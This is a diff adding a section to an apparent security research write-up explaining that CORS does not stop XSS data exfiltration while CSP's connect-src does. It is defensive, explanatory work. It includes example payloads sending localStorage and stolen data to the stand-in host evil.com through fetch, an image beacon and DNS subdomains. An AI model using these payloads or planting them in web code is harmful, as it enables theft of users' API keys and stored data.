@@ -73,6 +73,60 @@ echo "73686f64616e3a414243313233" | xxd -r -p
 
 ---
 
+## Why CORS Doesn't Protect Against This Attack
+
+A common misconception is that CORS (Cross-Origin Resource Sharing) prevents data exfiltration. It does not.
+
+### CORS vs XSS - Different Problems
+
+| | CORS | XSS |
+|---|------|-----|
+| **Protects** | Server's data from being *read* by other origins | User from malicious scripts in their browser |
+| **Enforced by** | Browser (based on server headers) | Nothing (unless CSP is implemented) |
+| **Direction** | Controls *reading* responses | Attacker *sends* data out |
+
+### Why CORS Fails Here
+
+CORS only blocks **reading responses** - it does NOT block **sending requests**.
+
+```javascript
+// XSS payload sends stolen data in the REQUEST:
+fetch('https://evil.com?yoink=' + hexEncode(localStorage))
+```
+
+**What happens:**
+1. Browser **SENDS** the request to `evil.com` with API keys in the URL
+2. Attacker's server receives and logs the stolen data
+3. CORS might block JavaScript from reading `evil.com`'s response
+4. **Attacker doesn't care** - they already captured the data in step 2
+
+### Additional CORS Bypasses
+
+```javascript
+// Images are not subject to CORS
+new Image().src = 'https://evil.com/steal?data=' + stolen;
+
+// DNS exfiltration - no HTTP response needed at all
+fetch('https://' + btoa(stolen).substring(0,50) + '.evil.oast.fun');
+// Attacker sees stolen data as subdomain in DNS query logs
+```
+
+### What Actually Protects: Content Security Policy (CSP)
+
+CSP's `connect-src` directive blocks requests from being **sent** to unauthorized domains:
+
+```
+connect-src 'self' https://api.shodan.io https://ipinfo.io ...
+```
+
+**TL;DR:**
+- CORS = "Can you read their response?"
+- CSP = "Can you talk to them at all?"
+
+Only CSP prevents the exfiltration.
+
+---
+
 ## Remediation Applied (This Fork)
 
 This security research fork demonstrates fixes for all identified vulnerabilities. These patches are offered to the upstream maintainer for consideration.
